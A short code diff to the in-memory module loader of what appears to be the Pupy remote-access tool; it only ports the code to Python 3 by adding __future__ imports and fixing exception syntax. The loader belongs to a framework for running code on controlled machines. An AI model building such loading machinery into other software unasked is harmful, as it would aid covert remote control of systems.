@@ -29,6 +29,10 @@
 
 # Public API
 
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 __all__ = (
     'EXTS_SOURCES', 'EXTS_COMPILED', 'EXTS_NATIVE', 'EXTS_ALL',
     'Blackhole', 'DummyPackageLoader', 'PupyPackageLoader',
@@ -461,7 +465,7 @@ class PupyPackageLoader(object):
                 try:
                     mod = self._make_module(fullname)
                     loadpy(self.contents[8:], mod.__dict__, self.extension == 'pye')
-                except Exception, e:
+                except Exception as e:
                     remote_error('Load {} failed: Exception: {}'.format(fullname, e))
                     raise
 
